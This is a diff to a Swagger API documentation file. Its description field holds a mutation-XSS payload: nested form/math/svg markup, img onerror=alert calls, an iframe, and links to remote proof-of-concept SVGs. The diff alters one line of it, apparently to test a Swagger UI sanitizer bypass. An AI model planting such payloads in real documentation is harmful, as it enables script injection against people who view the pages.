@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><h1>HACKED<img src='https://raw.githubusercontent.com/brinhosa/payloads/master/%22%3E%3Cimg%20src%3D1%20onerror%3Dalert(document.domain)%3Epoc.svg'/><textarea><path id="</textarea><iframe src='https://raw.githubusercontent.com/brinhosa/payloads/master/%22%3E%3Cimg%20src%3D1%20onerror%3Dalert(document.domain)%3Epoc.svg'/><img onerror=alert('XSS') src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><h1><b>HACKED<img src='https://raw.githubusercontent.com/brinhosa/payloads/master/%22%3E%3Cimg%20src%3D1%20onerror%3Dalert(document.domain)%3Epoc.svg'/><textarea><path id="</textarea><iframe src=document.location.href /><img onerror=alert('XSS') src=1>"></form>
 
   version: production
 basePath: /JSSResource/
